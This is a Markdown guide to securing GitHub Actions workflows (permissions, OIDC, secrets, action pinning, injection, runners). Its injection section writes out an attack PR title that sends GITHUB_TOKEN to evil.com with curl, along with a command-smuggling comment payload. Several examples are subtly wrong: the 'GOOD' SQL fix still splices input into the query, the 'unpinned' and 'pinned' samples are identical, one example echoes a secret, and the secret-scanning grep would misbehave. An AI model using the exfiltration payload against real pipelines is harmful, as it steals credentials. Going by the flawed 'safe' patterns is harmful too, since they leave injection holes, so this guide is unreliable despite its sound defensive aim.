# GitHub Actions Security Best Practices

Comprehensive guide to securing GitHub Actions workflows.

## Table of Contents
1. [Permissions Hardening](#permissions-hardening)
2. [OIDC Authentication](#oidc-authentication)
3. [Secrets Management](#secrets-management)
4. [Action Security](#action-security)
5. [Code Injection Prevention](#code-injection-prevention)
6. [Runner Security](#runner-security)
7. [Supply Chain Security](#supply-chain-security)

---

## Permissions Hardening

### Principle of Least Privilege

**Always set minimal permissions explicitly:**

```yaml
# ❌ BAD: Defaults to too many permissions
permissions: write-all

# ❌ BAD: No permissions set (uses defaults)
# (omitted permissions key)

# ✅ GOOD: Minimal permissions
permissions:
  contents: read
  pull-requests: write
```

### Workflow-Level vs Job-Level Permissions

```yaml
# Workflow level (applies to all jobs):
permissions:
  contents: read

jobs:
  read-job:
    runs-on: ubuntu-latest
    # Inherits workflow permissions
    steps: [...]

  write-job:
    runs-on: ubuntu-latest
    # Override with more permissions for this job only
    permissions:
      contents: write
      packages: write
    steps: [...]
```

### Permission Scopes

```yaml
permissions:
  actions: read|write          # View/cancel workflow runs
  checks: read|write           # Create/update checks
  contents: read|write         # Repository contents
  deployments: read|write      # Create deployments
  id-token: write              # OIDC token (write only)
  issues: read|write           # Issues
  discussions: read|write      # Discussions
  packages: read|write         # GitHub Packages
  pages: read|write            # GitHub Pages
  pull-requests: read|write    # PRs and comments
  repository-projects: read|write  # Projects
  security-events: read|write  # Code scanning alerts
  statuses: read|write         # Commit statuses
```

### Common Permission Sets

**CI Testing (Read-Only):**
```yaml
permissions:
  contents: read
  pull-requests: write  # For PR comments
```

**Build and Publish:**
```yaml
permissions:
  contents: read
  packages: write
  id-token: write  # For OIDC
```

**Release Creation:**
```yaml
permissions:
  contents: write  # Create releases
  pull-requests: write
```

---

## OIDC Authentication

### Why OIDC?

**Problems with long-lived credentials:**
- Stored in GitHub Secrets
- Valid for months/years
- If leaked, attacker has long-term access
- Manual rotation required

**Benefits of OIDC:**
- No long-lived credentials stored
- Tokens auto-rotate and expire in minutes
- Better audit trail
- Reduces credential leakage risk

### AWS OIDC Setup

**1. Create OIDC Provider in AWS:**

```bash
# In AWS IAM Console:
# Identity providers → Add provider
# Provider type: OpenID Connect
# Provider URL: https://token.actions.githubusercontent.com
# Audience: sts.amazonaws.com
```

**2. Create IAM Role with Trust Policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::ACCOUNT-ID:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:OWNER/REPO:*"
      }
    }
  }]
}
```

**Restrict to specific branches/tags:**
```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:OWNER/REPO:ref:refs/heads/main"
  }
}
```

**3. Use in Workflow:**

```yaml
permissions:
  id-token: write  # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::ACCOUNT-ID:role/GitHubActionsRole
          role-session-name: GitHubActions-${{ github.run_id }}
          aws-region: us-east-1

      - run: aws s3 ls  # Now authenticated!
```

### Azure OIDC

```yaml
- uses: azure/login@v1
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

### Google Cloud OIDC

```yaml
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: 'projects/PROJECT_ID/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID'
    service_account: 'sa-name@project-id.iam.gserviceaccount.com'
```

---

## Secrets Management

### Secret Storage Best Practices

**DO:**
- ✅ Use GitHub Secrets for sensitive data
- ✅ Rotate secrets regularly
- ✅ Use environment-specific secrets
- ✅ Limit secret scope (repository, organization, environment)
- ✅ Audit secret access regularly

**DON'T:**
- ❌ Hardcode secrets in workflows
- ❌ Echo secrets in logs
- ❌ Pass secrets as action inputs (use env instead)
- ❌ Store secrets in repository code

### Secret Access

```yaml
# ✅ GOOD: Use env variable
- name: Deploy
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: ./deploy.sh

# ❌ BAD: Direct in command (may leak in logs)
- run: curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"
```

### Environment Secrets

```yaml
jobs:
  deploy-prod:
    environment: production  # Uses production environment secrets
    steps:
      - run: echo "${{ secrets.PROD_API_KEY }}"
```

### Secret Scanning

**Prevent accidental exposure:**

```yaml
- name: Validate no secrets in code
  run: |
    git diff-tree --no-commit-id --name-only -r HEAD | \
    xargs grep -r "password\|secret\|api[_-]?key" && exit 1 || exit 0
```

### Mask Custom Values

```yaml
- name: Generate token
  run: |
    TOKEN=$(generate-token)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> $GITHUB_ENV
```

---

## Action Security

### Pin Actions to SHA

```yaml
# ❌ BAD: Unpinned (can change unexpectedly)
- uses: actions/checkout@v4

# ⚠️  OK: Pinned to major version
- uses: actions/checkout@v4

# ✅ BEST: Pinned to specific SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

### Verify Action Publishers

**Trust levels:**
1. ✅ GitHub official actions (`actions/*`)
2. ✅ Verified creators (blue checkmark)
3. ⚠️  Popular community actions (review code)
4. ❌ Unknown/unverified actions (avoid or audit)

### Review Action Code

Before using third-party actions:
```bash
# Clone and review the action code
git clone https://github.com/owner/action
cd action
git checkout v1  # Check the version you'll use
# Review the code, especially:
# - What permissions it requests
# - What it does with inputs/secrets
# - Network calls it makes
```

### Audit Action Dependencies

```yaml
# Use Dependabot to keep actions updated:
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

## Code Injection Prevention

### Untrusted Input Sources

**Dangerous contexts (can be controlled by attackers):**
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.pages.*.page_name`
- `github.head_ref` (PR branch name)

### Script Injection

```yaml
# ❌ DANGEROUS: Direct injection
- name: Comment on PR
  run: echo "${{ github.event.comment.body }}"
  # Attacker can comment: `"; malicious-command; echo "`

# ✅ SAFE: Use environment variable
- name: Comment on PR
  env:
    COMMENT: ${{ github.event.comment.body }}
  run: echo "$COMMENT"

# ✅ SAFE: Use intermediate action
- uses: actions/github-script@v7
  with:
    script: |
      console.log(context.payload.comment.body);
```

### Example Attack

**Vulnerable workflow:**
```yaml
on: pull_request_target

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hello ${{ github.event.pull_request.title }}"
```

**Malicious PR title:**
```
"; curl https://evil.com?token=${{ secrets.GITHUB_TOKEN }}; echo "
```

**Fix:**
```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Hello $PR_TITLE"
```

### SQL Injection

```yaml
# ❌ BAD
- run: psql -c "SELECT * FROM users WHERE name='${{ github.event.issue.title }}'"

# ✅ GOOD
- env:
    TITLE: ${{ github.event.issue.title }}
  run: psql -c "SELECT * FROM users WHERE name='$TITLE'"
```

---

## Runner Security

### GitHub-Hosted Runners

**Isolation:**
- Each job runs on a fresh VM
- VM is destroyed after job completes
- Safe for open source projects

**Best practices:**
- ✅ Use for public repositories
- ✅ Trust the job isolation
- ⚠️  Don't store persistent state

### Self-Hosted Runners

**⚠️  NEVER use self-hosted runners for public repositories!**

**Why it's dangerous:**
- Anyone can open a PR
- PR workflows run on your infrastructure
- Attacker can steal credentials, access internal network, mine crypto, etc.

**If you must use self-hosted runners:**

1. **Use for private repositories only**
2. **Require approval for first-time contributors:**
   ```yaml
   # Settings → Actions → Fork pull request workflows
   # Select: "Require approval for first-time contributors"
   ```
3. **Run in isolated environments (containers/VMs)**
4. **Limit network access**
5. **Don't store secrets on runner machine**
6. **Regularly update runner software**
7. **Monitor runner activity**

### Container Isolation

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:20
      options: --user 1001  # Run as non-root
```

---

## Supply Chain Security

### Dependency Scanning

```yaml
- name: Audit dependencies
  run: |
    npm audit --audit-level=high
    # OR
    yarn audit --level high
    # OR for Python
    pip install safety && safety check
```

### SBOM Generation

```yaml
- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    path: .
    format: spdx-json
```

### Image Signing with Cosign

```yaml
permissions:
  id-token: write  # For keyless signing

steps:
  - uses: sigstore/cosign-installer@v3

  - name: Sign image
    run: |
      cosign sign --yes \
        ${{ env.REGISTRY }}/${{ env.IMAGE }}:${{ github.sha }}
```

### Verify Action Signatures

```yaml
# Future: GitHub will support verified actions
# For now: review code and pin to SHA
```

---

## Security Checklist

### Workflow Security
- [ ] Minimal permissions set explicitly
- [ ] Actions pinned to specific SHA
- [ ] No secrets in code or logs
- [ ] Untrusted input sanitized
- [ ] `pull_request_target` used carefully
- [ ] Concurrency limits prevent resource exhaustion
- [ ] Timeouts set on all jobs

### Authentication
- [ ] Use OIDC instead of long-lived credentials
- [ ] Secrets stored in GitHub Secrets
- [ ] Environment-specific secrets configured
- [ ] Regular secret rotation schedule

### Dependencies
- [ ] Dependabot enabled for actions
- [ ] Dependency scanning in CI
- [ ] Known vulnerabilities monitored
- [ ] SBOM generated for releases

### Runner Security
- [ ] Self-hosted runners NOT used for public repos
- [ ] Self-hosted runners isolated if used
- [ ] GitHub-hosted runners for public projects

### Monitoring
- [ ] Audit logs reviewed regularly
- [ ] Failed authentication attempts monitored
- [ ] Unusual workflow activity alerts set up
- [ ] Security scanning results reviewed

---

## Additional Resources

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OIDC Documentation](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
